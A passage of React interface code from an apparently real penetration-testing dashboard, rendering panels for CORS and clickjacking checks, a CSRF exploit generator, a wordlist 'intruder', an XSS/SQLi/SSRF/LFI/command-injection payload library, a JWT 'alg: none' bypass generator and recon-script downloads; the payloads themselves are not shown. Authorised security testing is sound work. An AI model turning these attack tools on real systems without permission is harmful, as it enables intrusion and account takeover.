              </button>
            </div>
            <p className="helper-notice">Discovered routes and directory status codes will output in the Cyber Console below.</p>
          </div>
        )}

        {/* ----------------- PHASE 3 ACTIVE DAST TOOLS ----------------- */}
        {currentPhase === 'phase3' && activeSubTool === 'cors' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">CORS Misconfiguration & Trust Verification</h3>
                <p className="tool-desc">Sends arbitrary origins (evil-attacker.com, null) to test if server reflects Origin headers with Access-Control-Allow-Credentials: true.</p>
              </div>
              <button
                type="button"
                onClick={runCorsTest}
                disabled={corsTesting}
                className="neo-glass-btn primary"
              >
                <ArrowRightLeft size={14} />
                <span>{corsTesting ? 'Auditing CORS...' : 'Test CORS Policies'}</span>
              </button>
            </div>

            {corsResults && (
              <div className="tool-results-surface">
                <div className="cors-results-grid">
                  {corsResults.map((c, i) => (
                    <div key={i} className={`cors-item-card ${c.severity?.toLowerCase()}`}>
                      <div className="cors-card-head">
                        <span className="cors-origin-name">{c.label} ({c.origin})</span>
                        <span className={`cors-sev-pill ${c.severity?.toLowerCase()}`}>{c.severity}</span>
                      </div>
                      <div className="cors-meta-line">
                        <span>ACAO: <strong>{c.acao}</strong></span>
                        <span>ACAC: <strong>{c.acac}</strong></span>
                      </div>
                      <p className="cors-desc">{c.explanation}</p>
                      <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap', marginTop: '10px' }}>
                        <button
                          type="button"
                          onClick={() => downloadCorsPoc(c)}
                          className="push-report-mini-btn"
                          style={{ background: 'rgba(56, 189, 248, 0.15)', borderColor: 'rgba(56, 189, 248, 0.4)', color: '#38bdf8' }}
                        >
                          <Download size={12} /> Download PoC HTML
                        </button>
                        {c.severity === 'CRITICAL' && (
                          <button
                            type="button"
                            onClick={() => handlePushFindingToProject({ title: 'Severe CORS Misconfiguration (Credential Leak)', severity: 'CRITICAL', desc: c.explanation, remediation: 'Do not reflect untrusted origins with Access-Control-Allow-Credentials: true.' })}
                            className="push-report-mini-btn"
                          >
                            <BookmarkPlus size={12} /> Push Finding to Report
                          </button>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}

        {/* CLICKJACKING TESTER */}
        {currentPhase === 'phase3' && activeSubTool === 'clickjacking' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">Clickjacking (UI Redressing) Header & Framing Auditor</h3>
                <p className="tool-desc">Tests whether the target allows embedding in third-party iframes by verifying X-Frame-Options (DENY/SAMEORIGIN) and CSP frame-ancestors.</p>
              </div>
              <div className="tool-actions-right">
                <button
                  type="button"
                  onClick={runClickjackTest}
                  disabled={clickjackTesting}
                  className="neo-glass-btn primary"
                >
                  <MousePointer size={14} />
                  <span>{clickjackTesting ? 'Auditing Framing...' : 'Audit Clickjacking'}</span>
                </button>
              </div>
            </div>

            {clickjackResult && (
              <div className="tool-results-surface">
                <div className="clickjack-status-banner">
                  <div className="clickjack-verdict-group">
                    <span className={`verdict-badge ${clickjackResult.isProtected ? 'pass' : 'fail'}`}>
                      {clickjackResult.isProtected ? '✓ SECURE (Framing Blocked)' : '⚠️ VULNERABLE TO CLICKJACKING'}
                    </span>
                    <p className="verdict-desc">{clickjackResult.description}</p>
                  </div>
                  {!clickjackResult.isProtected && (
                    <button
                      type="button"
                      onClick={() => handlePushFindingToProject({
                        title: 'Missing Anti-Clickjacking Frame Protection',
                        severity: 'MEDIUM',
                        desc: clickjackResult.description,
                        remediation: "Set X-Frame-Options: SAMEORIGIN or Content-Security-Policy: frame-ancestors 'self'."
                      })}
                      className="push-report-mini-btn"
                      style={{ padding: '8px 16px', alignSelf: 'flex-start' }}
                    >
                      <BookmarkPlus size={14} /> Push Finding to Report
                    </button>
                  )}
                </div>

                <div className="clickjack-meta-grid">
                  <div className="meta-tile">
                    <span className="lbl">X-Frame-Options Header</span>
                    <span className={`val mono ${clickjackResult.xFrameValue === 'MISSING' ? 'red' : 'green'}`}>
                      {clickjackResult.xFrameValue}
                    </span>
                  </div>
                  <div className="meta-tile">
                    <span className="lbl">CSP frame-ancestors Directive</span>
                    <span className={`val mono ${clickjackResult.cspFrameAncestors === 'MISSING' ? 'red' : 'green'}`}>
                      {clickjackResult.cspFrameAncestors}
                    </span>
                  </div>
                  <div className="meta-tile">
                    <span className="lbl">Target URL</span>
                    <span className="val mono">{clickjackResult.url}</span>
                  </div>
                </div>

                {/* Interactive Sandboxed Iframe Simulation */}
                <div className="clickjack-simulator-box">
                  <div className="simulator-controls-bar">
                    <span className="simulator-title">
                      <Eye size={14} color="var(--accent-cyan)" /> Live Framing Sandbox Test
                    </span>
                    <div className="opacity-slider-wrap">
                      <span>Overlay Opacity: {Math.round(clickjackOverlayOpacity * 100)}%</span>
                      <input
                        type="range"
                        min="0.1"
                        max="1"
                        step="0.05"
                        value={clickjackOverlayOpacity}
                        onChange={(e) => setClickjackOverlayOpacity(parseFloat(e.target.value))}
                        className="opacity-slider"
                      />
                    </div>
                  </div>
                  <div className="sandbox-frame-wrapper">
                    <iframe
                      src={sharedUrl}
                      title="Clickjacking Simulation"
                      className="clickjack-live-iframe"
                      style={{ opacity: clickjackOverlayOpacity }}
                    />
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* CSRF POC EXPLOIT STUDIO */}
        {currentPhase === 'phase3' && activeSubTool === 'csrf' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">Cross-Site Request Forgery (CSRF) PoC Exploit Studio</h3>
                <p className="tool-desc">Build automated self-submitting HTML exploit payloads to demonstrate CSRF and missing Anti-CSRF token vulnerabilities.</p>
              </div>
              <div className="tool-actions-right">
                <button
                  type="button"
                  onClick={downloadCsrfPoc}
                  className="neo-glass-btn primary"
                >
                  <Download size={14} />
                  <span>Download Exploit (.html)</span>
                </button>
                <button
                  type="button"
                  onClick={() => handlePushFindingToProject({
                    title: 'Cross-Site Request Forgery (CSRF) Vulnerability',
                    severity: 'HIGH',
                    desc: `Endpoint ${csrfActionUrl} lacks anti-CSRF token verification and SameSite cookie protection.`,
                    evidence: generatedCsrfHtml,
                    remediation: 'Implement synchronized Anti-CSRF tokens or custom request headers (X-Requested-With) and SameSite=Strict cookies.'
                  })}
                  className="neo-glass-btn secondary"
                >
                  <BookmarkPlus size={14} />
                  <span>Push CSRF Finding to DB</span>
                </button>
              </div>
            </div>

            <div className="csrf-studio-grid">
              {/* Left Column: Form Configuration */}
              <div className="csrf-config-col">
                <div className="form-group-mini">
                  <label className="field-label">Target Action URL</label>
                  <input
                    type="text"
                    className="scope-text-input mono"
                    value={csrfActionUrl}
                    onChange={(e) => setCsrfActionUrl(e.target.value)}
                    placeholder="https://target.gov.in/api/user/update"
                  />
                </div>

                <div className="csrf-options-row">
                  <div className="form-group-mini">
                    <label className="field-label">HTTP Method</label>
                    <select
                      className="preset-select"
                      value={csrfMethod}
                      onChange={(e) => setCsrfMethod(e.target.value)}
                    >
                      <option value="POST">POST</option>
                      <option value="PUT">PUT</option>
                      <option value="GET">GET</option>
                      <option value="DELETE">DELETE</option>
                    </select>
                  </div>

                  <div className="form-group-mini">
                    <label className="field-label">Enctype</label>
                    <select
                      className="preset-select"
                      value={csrfEnctype}
                      onChange={(e) => setCsrfEnctype(e.target.value)}
                    >
                      <option value="application/x-www-form-urlencoded">x-www-form-urlencoded</option>
                      <option value="multipart/form-data">multipart/form-data</option>
                      <option value="text/plain">text/plain</option>
                    </select>
                  </div>
                </div>

                <div className="form-group-mini">
                  <label className="field-label" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span>Payload Parameters</span>
                    <button type="button" onClick={addCsrfParam} className="add-param-btn">
                      <Plus size={12} /> Add Parameter
                    </button>
                  </label>
                  <div className="csrf-params-list">
                    {csrfParams.map((p, idx) => (
                      <div key={idx} className="csrf-param-row">
                        <input
                          type="text"
                          className="param-input key mono"
                          placeholder="key"
                          value={p.key}
                          onChange={(e) => updateCsrfParam(idx, 'key', e.target.value)}
                        />
                        <span className="param-eq">=</span>
                        <input
                          type="text"
                          className="param-input val mono"
                          placeholder="value"
                          value={p.value}
                          onChange={(e) => updateCsrfParam(idx, 'value', e.target.value)}
                        />
                        <button type="button" onClick={() => removeCsrfParam(idx)} className="del-param-btn">
                          <Trash2 size={13} />
                        </button>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="csrf-toggle-row">
                  <label className="checkbox-label">
                    <input
                      type="checkbox"
                      checked={csrfAutoSubmit}
                      onChange={(e) => setCsrfAutoSubmit(e.target.checked)}
                    />
                    <span>Include Automated JavaScript Auto-Submit Payload</span>
                  </label>
                </div>
              </div>

              {/* Right Column: Generated Exploit HTML */}
              <div className="csrf-code-col">
                <div className="code-header-bar">
                  <span className="code-header-title">
                    <Code size={14} color="var(--accent-cyan)" /> Generated PoC Exploit (HTML)
                  </span>
                  <button
                    type="button"
                    onClick={() => copyToClipboard(generatedCsrfHtml, 'csrf-poc')}
                    className="copy-code-btn"
                  >
                    {copiedKey === 'csrf-poc' ? <Check size={13} color="#10b981" /> : <Copy size={13} />}
                    <span>{copiedKey === 'csrf-poc' ? 'Copied' : 'Copy HTML'}</span>
                  </button>
                </div>
                <textarea
                  className="csrf-generated-textarea mono"
                  rows={14}
                  readOnly
                  value={generatedCsrfHtml}
                />
              </div>
            </div>
          </div>
        )}

        {currentPhase === 'phase4' && activeSubTool === 'crypto_intruder' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">🔐 AES PBKDF2 Encrypt / Decrypt Studio & Crypto Intruder</h3>
                <p className="tool-desc">Full-featured AES CBC/PBKDF2 engine matching enterprise encryption standards with live Wordlist & Sequence intruder attacks.</p>
              </div>
            </div>

            {/* Crypto Settings Bar */}
            <div className="crypto-settings-card">
              <div className="crypto-settings-grid">
                <div className="setting-field">
                  <label className="field-label">Found / Target Passphrase Key</label>
                  <div style={{ display: 'flex', gap: '8px' }}>
                    <input
                      type="text"
                      className="scope-text-input mono"
                      value={aesPassphrase}
                      onChange={(e) => setAesPassphrase(e.target.value)}
                      placeholder="Enter secret passphrase..."
                    />
                    <button type="button" onClick={handleSaveKey} className="neo-glass-btn secondary" style={{ padding: '6px 14px', fontSize: '12px' }}>
                      💾 Save Key
                    </button>
                  </div>
                </div>

                <div className="setting-field">
                  <label className="field-label">Key History ({aesKeyHistory.length})</label>
                  <select
                    className="preset-select"
                    value={aesPassphrase}
                    onChange={(e) => setAesPassphrase(e.target.value)}
                  >
                    {aesKeyHistory.map((k, i) => (
                      <option key={i} value={k}>{k}</option>
                    ))}
                  </select>
                </div>

                <div className="setting-field">
                  <label className="field-label">Key Size (Bits)</label>
                  <select
                    className="preset-select"
                    value={aesKeySize}
                    onChange={(e) => setAesKeySize(parseInt(e.target.value, 10))}
                  >
                    <option value={128}>128-bit AES</option>
                    <option value={192}>192-bit AES</option>
                    <option value={256}>256-bit AES</option>
                  </select>
                </div>

                <div className="setting-field">
                  <label className="field-label">PBKDF2 Iterations</label>
                  <input
                    type="number"
                    min="100"
                    max="100000"
                    step="100"
                    className="scope-text-input mono"
                    value={aesIterations}
                    onChange={(e) => setAesIterations(parseInt(e.target.value, 10) || 1000)}
                  />
                </div>
              </div>
            </div>

            {/* Side-by-Side Encrypt and Decrypt */}
            <div className="aes-duo-grid">
              {/* Encrypt Box */}
              <div className="crypto-box-card">
                <div className="box-card-head">
                  <h4>🔒 Encrypt Plaintext</h4>
                  <button
                    type="button"
                    onClick={() => copyToClipboard(aesEncryptedOutput, 'aes-enc')}
                    className="copy-mini-btn"
                    disabled={!aesEncryptedOutput}
                  >
                    {copiedKey === 'aes-enc' ? <Check size={13} color="#10b981" /> : <Copy size={13} />}
                    <span>{copiedKey === 'aes-enc' ? 'Copied' : 'Copy Output'}</span>
                  </button>
                </div>
                <textarea
                  className="scope-text-input mono"
                  rows={4}
                  value={aesPlainText}
                  onChange={(e) => setAesPlainText(e.target.value)}
                  placeholder="Enter plaintext to encrypt..."
                />
                <button type="button" onClick={handleAesEncrypt} className="neo-glass-btn primary" style={{ width: '100%', justifyContent: 'center', marginTop: '10px' }}>
                  🔒 Encrypt with AES-PBKDF2
                </button>
                <div style={{ marginTop: '12px' }}>
                  <span className="field-label">Base64 Output (iv::salt::ciphertext)</span>
                  <textarea
                    className="scope-text-input mono"
                    rows={3}
                    readOnly
                    value={aesEncryptedOutput}
                    placeholder="Encrypted token appears here..."
                  />
                </div>
              </div>

              {/* Decrypt Box */}
              <div className="crypto-box-card">
                <div className="box-card-head">
                  <h4>🔓 Decrypt Ciphertext</h4>
                  <button
                    type="button"
                    onClick={() => copyToClipboard(aesDecryptedOutput, 'aes-dec')}
                    className="copy-mini-btn"
                    disabled={!aesDecryptedOutput}
                  >
                    {copiedKey === 'aes-dec' ? <Check size={13} color="#10b981" /> : <Copy size={13} />}
                    <span>{copiedKey === 'aes-dec' ? 'Copied' : 'Copy Plaintext'}</span>
                  </button>
                </div>
                <textarea
                  className="scope-text-input mono"
                  rows={4}
                  value={aesCipherText}
                  onChange={(e) => setAesCipherText(e.target.value)}
                  placeholder="Paste base64 ciphertext (iv::salt::ciphertext)..."
                />
                <button type="button" onClick={handleAesDecrypt} className="neo-glass-btn secondary" style={{ width: '100%', justifyContent: 'center', marginTop: '10px' }}>
                  🔓 Decrypt Payload
                </button>
                <div style={{ marginTop: '12px' }}>
                  <span className="field-label">Decrypted Plaintext Output</span>
                  <textarea
                    className="scope-text-input mono"
                    rows={3}
                    readOnly
                    value={aesDecryptedOutput}
                    placeholder="Decrypted plaintext appears here..."
                  />
                </div>
              </div>
            </div>

            {/* CRYPTO INTRUDER SECTION */}
            <div className="crypto-intruder-container">
              <div className="intruder-top-bar">
                <div>
                  <h4 style={{ margin: '0 0 4px 0', fontSize: '17px', color: '#38bdf8', fontWeight: 800 }}>
                    🚀 Crypto Intruder (Bulk Wordlist & Sequence Attack)
                  </h4>
                  <p style={{ margin: 0, fontSize: '13px', color: 'var(--text-muted)' }}>
                    Generate or paste a payload wordlist to perform rapid bulk-encryption tokens using current key parameters.
                  </p>
                </div>
              </div>

              <div className="intruder-options-grid">
                {/* Option A */}
                <div className="intruder-card">
                  <div className="intruder-card-title">Option A: Paste Wordlist</div>
                  <label className="field-label">Payload Values (one per line)</label>
                  <textarea
                    className="scope-text-input mono"
                    rows={7}
                    value={intruderWordlist}
                    onChange={(e) => setIntruderWordlist(e.target.value)}
                    placeholder="admin&#10;password123&#10;user001"
                  />
                  <div style={{ fontSize: '12px', color: 'var(--text-muted)', marginTop: '4px' }}>
                    {intruderWordlist.split('\n').filter(l => l.trim()).length} payload item(s)
                  </div>
                </div>

                {/* Option B */}
                <div className="intruder-card">
                  <div className="intruder-card-title">Option B: Generate Sequence</div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                    <div>
                      <label className="field-label">Prefix</label>
                      <input
                        type="text"
                        className="scope-text-input mono"
                        value={intruderPrefix}
                        onChange={(e) => setIntruderPrefix(e.target.value)}
                        placeholder="e.g. user_"
                      />
                    </div>
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                      <div>
                        <label className="field-label">From</label>
                        <input
                          type="number"
                          className="scope-text-input mono"
                          value={intruderMin}
                          onChange={(e) => setIntruderMin(e.target.value)}
                        />
                      </div>
                      <div>
                        <label className="field-label">To</label>
                        <input
                          type="number"
                          className="scope-text-input mono"
                          value={intruderMax}
                          onChange={(e) => setIntruderMax(e.target.value)}
                        />
                      </div>
                    </div>
                    <div>
                      <label className="field-label">Suffix</label>
                      <input
                        type="text"
                        className="scope-text-input mono"
                        value={intruderSuffix}
                        onChange={(e) => setIntruderSuffix(e.target.value)}
                        placeholder="e.g. @corp.in"
                      />
                    </div>
                    <button
                      type="button"
                      onClick={handleGenerateSequence}
                      className="neo-glass-btn secondary"
                      style={{ width: '100%', justifyContent: 'center' }}
                    >
                      ⚙️ Generate & Load into Wordlist
                    </button>
                  </div>
                </div>
              </div>

              {/* Start Intruder Button */}
              <div style={{ marginTop: '16px' }}>
                <button
                  type="button"
                  onClick={handleRunIntruder}
                  disabled={intruderRunning}
                  className="neo-glass-btn primary"
                  style={{ width: '100%', justifyContent: 'center', padding: '12px 24px', fontSize: '15px' }}
                >
                  <Play size={16} />
                  <span>{intruderRunning ? `Encrypting Payloads (${intruderProgress}%)... ` : '🚀 START INTRUDER ATTACK'}</span>
                </button>
              </div>

              {/* Intruder Results */}
              {intruderResults && (
                <div style={{ marginTop: '18px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                    <span className="field-label" style={{ color: '#10b981', fontWeight: 700 }}>
                      ✓ Generated Encrypted Tokens ({intruderTokensCount})
                    </span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(intruderResults, 'intruder-tokens')}
                      className="neo-glass-btn secondary"
                      style={{ padding: '4px 12px', fontSize: '12px' }}
                    >
                      {copiedKey === 'intruder-tokens' ? <Check size={13} color="#10b981" /> : <Copy size={13} />}
                      <span>{copiedKey === 'intruder-tokens' ? 'Copied' : '📋 Copy All Tokens'}</span>
                    </button>
                  </div>
                  <textarea
                    className="scope-text-input mono"
                    rows={8}
                    readOnly
                    value={intruderResults}
                  />
                </div>
              )}
            </div>
          </div>
        )}

        {/* PAYLOADS WORKSHOP */}
        {currentPhase === 'phase3' && activeSubTool === 'payloads' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">Vulnerability Exploit & Verification Payloads</h3>
                <p className="tool-desc">Verified penetration testing vectors for XSS, SQLi, SSRF, LFI, CMDi, and Template Injection with 1-click copy.</p>
              </div>
              <div className="tool-actions-right">
                <input
                  type="text"
                  placeholder="Search payloads..."
                  value={payloadSearch}
                  onChange={(e) => setPayloadSearch(e.target.value)}
                  className="payload-search-input"
                />
              </div>
            </div>

            <div className="payloads-category-chips">
              {['ALL', 'XSS', 'SQLi', 'SSRF', 'LFI', 'CMDi'].map(cat => (
                <button
                  key={cat}
                  type="button"
                  className={`payload-chip-btn ${payloadCategory === cat ? 'active' : ''}`}
                  onClick={() => setPayloadCategory(cat)}
                >
                  {cat}
                </button>
              ))}
            </div>

            <div className="payloads-cards-grid">
              {filteredPayloads.map((p, i) => (
                <div key={i} className="payload-box-card">
                  <div className="payload-card-head">
                    <span className={`payload-cat-tag ${p.cat.toLowerCase()}`}>{p.cat}</span>
                    <span className="payload-name">{p.name}</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(p.code, `payload-${i}`)}
                      className="copy-payload-icon-btn"
                      title="Copy Payload"
                    >
                      {copiedKey === `payload-${i}` ? <Check size={14} color="#10b981" /> : <Copy size={14} />}
                    </button>
                  </div>
                  <pre className="payload-code-block mono">{p.code}</pre>
                  <span className="payload-context-hint">Context: {p.context}</span>
                </div>
              ))}
            </div>
          </div>
        )}

        {currentPhase === 'phase3' && activeSubTool === 'sqlmap' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">SQLMap Database Auditor & Injection Prober</h3>
                <p className="tool-desc">Tests URL parameters with quote injection and detects MySQL, PostgreSQL, Oracle, SQLite, and MSSQL database error signatures.</p>
              </div>
              <button
                type="button"
                onClick={() => runSingleTool('sqlmap', 'SQLMap Database Auditor')}
                disabled={runningToolId === 'sqlmap'}
                className="neo-glass-btn primary"
              >
                <Database size={14} />
                <span>{runningToolId === 'sqlmap' ? 'Testing SQLi...' : 'Run SQLMap Probe'}</span>
              </button>
            </div>
            <p className="helper-notice">Heuristics, parameter tests, and DBMS error detection logs will stream to the Cyber Console.</p>
          </div>
        )}

        {currentPhase === 'phase3' && activeSubTool === 'dalfox' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">Dalfox Reflected XSS Verifier</h3>
                <p className="tool-desc">Injects contextual XSS payloads into query parameters and checks if HTML script tags render unescaped in the response.</p>
              </div>
              <button
                type="button"
                onClick={() => runSingleTool('dalfox', 'Dalfox XSS Scanner')}
                disabled={runningToolId === 'dalfox'}
                className="neo-glass-btn primary"
              >
                <Flame size={14} />
                <span>{runningToolId === 'dalfox' ? 'Verifying XSS...' : 'Run Dalfox XSS Scan'}</span>
              </button>
            </div>
            <p className="helper-notice">Parameter reflection analysis and verified PoC outputs will stream to the Cyber Console.</p>
          </div>
        )}

        {/* ----------------- PHASE 4 TOOLS ----------------- */}
        {currentPhase === 'phase4' && activeSubTool === 'jwt' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">JWT Token Debugger & "alg: none" Exploit Generator</h3>
                <p className="tool-desc">Parses JSON Web Token headers and payloads, with 1-click generation of 'alg: none' signature bypass tokens for authentication testing.</p>
              </div>
              <button
                type="button"
                onClick={generateNoneAlgToken}
                className="neo-glass-btn secondary"
              >
                <Sparkles size={14} />
                <span>Generate "alg: none" Bypass Token</span>
              </button>
            </div>

            <div className="jwt-debugger-grid">
              <div className="jwt-input-col">
                <span className="field-label">Encoded JWT Token</span>
                <textarea
                  className="jwt-textarea mono"
                  rows={6}
                  value={jwtInput}
                  onChange={(e) => setJwtInput(e.target.value)}
                />
              </div>

              <div className="jwt-parsed-col">
                <div className="parsed-box">
                  <span className="box-tag red">Header: Algorithm & Token Type</span>
                  <pre className="json-pre">{JSON.stringify(jwtHeader, null, 2)}</pre>
                </div>
                <div className="parsed-box">
                  <span className="box-tag purple">Payload: Claims & Identity Data</span>
                  <pre className="json-pre">{JSON.stringify(jwtPayload, null, 2)}</pre>
                </div>
              </div>
            </div>
          </div>
        )}

        {currentPhase === 'phase4' && activeSubTool === 'encoder' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">Multi-Encoder / Decoder, AES-128/256 PBKDF2 & Hash Identifier</h3>
                <p className="tool-desc">Enterprise cryptographic conversions including Base64, URL, Hex, Rot13, MD5, SHA-256, and AES CBC encryption.</p>
              </div>
              <select
                className="preset-select"
                value={encoderMode}
                onChange={(e) => setEncoderMode(e.target.value)}
              >
                <option value="base64">Base64 Encode</option>
                <option value="base64_decode">Base64 Decode</option>
                <option value="url_encode">URL Encode</option>
                <option value="url_decode">URL Decode</option>
                <option value="hex_encode">Hex Encode</option>
                <option value="hex_decode">Hex Decode</option>
                <option value="rot13">ROT13 Cipher</option>
                <option value="md5">MD5 Hash</option>
                <option value="sha1">SHA-1 Hash</option>
                <option value="sha256">SHA-256 Hash</option>
                <option value="sha512">SHA-512 Hash</option>
                <option value="aes_encrypt">AES Encrypt (PBKDF2)</option>
                <option value="aes_decrypt">AES Decrypt (PBKDF2)</option>
              </select>
            </div>

            <div className="encoder-io-grid">
              <div className="encoder-field">
                <span className="field-label">Input Text</span>
                <textarea
                  className="scope-text-input mono"
                  rows={4}
                  value={encoderInput}
                  onChange={(e) => setEncoderInput(e.target.value)}
                />
              </div>
              <div className="encoder-field">
                <span className="field-label">Encoded / Computed Output</span>
                <textarea
                  className="scope-text-input mono"
                  rows={4}
                  readOnly
                  value={encoderOutput}
                />
              </div>
            </div>

            {/* Hash Identifier Bar */}
            <div className="hash-identifier-bar">
              <span className="field-label">Instant Hash Type Identifier</span>
              <div className="hash-probe-line">
                <input
                  type="text"
                  className="scope-text-input mono"
                  placeholder="Paste any hash e.g. 5f4dcc3b5aa765d61d8327deb882cf99 or $2y$10$..."
                  value={hashProbeInput}
                  onChange={(e) => {
                    setHashProbeInput(e.target.value);
                    identifyHashType(e.target.value);
                  }}
                />
              </div>
              {identifiedHash && (
                <div className="hash-candidates-strip">
                  <span>Detected Type:</span>
                  {identifiedHash.candidates.map((c, i) => (
                    <span key={i} className="candidate-pill">{c}</span>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {currentPhase === 'phase4' && activeSubTool === 'scripts' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">Download Automated Kali / Windows Recon Scripts</h3>
                <p className="tool-desc">Generate pre-configured command sequences for Kali Linux (.sh) or Windows (.bat) targeting {currentHost}.</p>
              </div>
              <div className="script-download-buttons">
                <button
                  type="button"
                  onClick={() => downloadReconScript('sh')}
                  className="neo-glass-btn primary"
                >
                  <Download size={14} />
                  <span>Download Kali Linux Script (.sh)</span>
                </button>
                <button
                  type="button"
                  onClick={() => downloadReconScript('bat')}
                  className="neo-glass-btn secondary"
                >
                  <Download size={14} />
                  <span>Download Windows Batch (.bat)</span>
                </button>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* 5. INTEGRATED HIGH-TECH CYBER CONSOLE DOCK */}
      {consoleOpen && (
        <div className={`cyber-console-dock ${consoleFullscreen ? 'fullscreen' : ''}`}>
          <div className="console-dock-header">
            <div className="console-title-group">
              <Terminal size={16} className="terminal-icon" />
              <span className="console-title-text">
                Cyber Intelligence Console — {activeScanResult?.toolName || 'Live Assessment Stream'}
              </span>
            </div>

            {/* Console Tab Switchers */}
            <div className="console-tabs-row">
              <button
                type="button"
                className={`console-tab-btn ${consoleTab === 'logs' ? 'active' : ''}`}
                onClick={() => setConsoleTab('logs')}
              >
                📜 Live CLI Logs
              </button>
              <button
                type="button"
                className={`console-tab-btn ${consoleTab === 'findings' ? 'active' : ''}`}
                onClick={() => setConsoleTab('findings')}
              >
                🛡️ Findings ({activeScanResult?.findings?.length || accumulatedFindings.length || 0})
              </button>
              <button
                type="button"
                className={`console-tab-btn ${consoleTab === 'traffic' ? 'active' : ''}`}
                onClick={() => setConsoleTab('traffic')}
              >
                🌐 Raw HTTP Traffic
              </button>
              <button
                type="button"
                className={`console-tab-btn ${consoleTab === 'summary' ? 'active' : ''}`}
                onClick={() => setConsoleTab('summary')}
              >
                📊 Executive Summary
              </button>
            </div>

            {/* Console Action Buttons */}
            <div className="console-header-actions">
              <button
                type="button"
                onClick={() => copyToClipboard(activeScanResult?.rawOutput || orchestratorLogs, 'console-logs')}
                className="console-btn-icon"
                title="Copy Terminal Logs"
              >
                {copiedKey === 'console-logs' ? <Check size={13} color="#10b981" /> : <Copy size={13} />}
              </button>
              <button
                type="button"
                onClick={() => downloadConsoleLogs('txt')}
                className="console-btn-icon"
                title="Download .txt output"
              >
                <Download size={13} />
              </button>
              <button
                type="button"
                onClick={() => setConsoleFullscreen(!consoleFullscreen)}
                className="console-btn-icon"
                title={consoleFullscreen ? 'Restore Dock Size' : 'Fullscreen Terminal'}
              >
                {consoleFullscreen ? <Minimize2 size={13} /> : <Maximize2 size={13} />}
              </button>
              <button
                type="button"
                onClick={() => setConsoleOpen(false)}
                className="console-btn-icon close"
                title="Close Cyber Console"
              >
                <X size={14} />
              </button>
            </div>
          </div>

          {/* Console Tab Content */}
          <div className="console-dock-body">
            {consoleTab === 'logs' && (
              <pre className="terminal-live-feed">
                {activeScanResult?.rawOutput || orchestratorLogs || 'Awaiting live tool execution or automated pipeline run...'}
              </pre>
            )}

            {consoleTab === 'findings' && (
              <div className="console-findings-tray">
                {(activeScanResult?.findings || accumulatedFindings).length === 0 ? (
                  <div className="empty-findings-state">
                    <ShieldCheck size={28} color="#10b981" />
                    <span>No vulnerabilities or anomalies discovered in this scan cycle.</span>
                  </div>
                ) : (
                  <div className="findings-stream-grid">
                    {(activeScanResult?.findings || accumulatedFindings).map((f, i) => (
                      <div key={i} className={`finding-stream-card ${(f.severity || 'medium').toLowerCase()}`}>
                        <div className="finding-card-head">
                          <span className={`sev-tag ${(f.severity || 'medium').toLowerCase()}`}>
                            {f.severity || 'MEDIUM'}
                          </span>
                          <span className="finding-name">{f.title || f.name}</span>
                          <span className="cwe-pill">{f.cweNumber || 'CWE-200'}</span>
                        </div>
                        <p className="finding-desc-txt">{f.desc || f.description}</p>
                        {f.evidence && (
                          <div className="finding-evidence-mono">
                            <code>{f.evidence}</code>
                          </div>
                        )}
                        <div className="finding-card-actions">
                          <button
                            type="button"
                            onClick={() => handlePushFindingToProject(f)}
                            className="push-report-mini-btn"
                          >
                            <BookmarkPlus size={12} /> Push to Project Report
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            {consoleTab === 'traffic' && (
              <div className="console-traffic-viewer">
                <div className="traffic-pane">
                  <span className="traffic-pane-lbl">Target Target Host</span>
                  <pre className="traffic-data-mono">{currentHost}</pre>
                </div>
                <div className="traffic-pane">
                  <span className="traffic-pane-lbl">Request Headers Dispatched</span>
                  <pre className="traffic-data-mono">
{JSON.stringify({
  'User-Agent': 'Mozilla/5.0 (compatible; BISAG-N-VAPT-Orchestrator/2.0)',
  'Accept': '*/*',
  'X-Audit-Scope': currentHost,
  'Connection': 'keep-alive'
}, null, 2)}
                  </pre>
                </div>
              </div>
            )}

            {consoleTab === 'summary' && (
              <div className="console-summary-dashboard">
                <div className="summary-tile">
                  <span className="summary-val">{activeScanResult?.success ? 'PASS (Completed)' : 'IDLE'}</span>
                  <span className="summary-lbl">Pipeline Status</span>
                </div>
                <div className="summary-tile">
                  <span className="summary-val">{activeScanResult?.duration || 'Real-time'}</span>
                  <span className="summary-lbl">Execution Duration</span>
                </div>
                <div className="summary-tile">
                  <span className="summary-val">{activeScanResult?.mode || 'LIVE_ENGINE'}</span>
                  <span className="summary-lbl">Execution Mode</span>
                </div>
                <div className="summary-tile">
                  <span className="summary-val">{(activeScanResult?.findings || accumulatedFindings).length}</span>
                  <span className="summary-lbl">Findings Count</span>
                </div>
                <div className="summary-tile">
                  <span className="summary-val">{currentHost}</span>
                  <span className="summary-lbl">Target Hostname</span>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Toast Notification */}
      {toastMessage && (
        <div className="cyber-studio-toast">
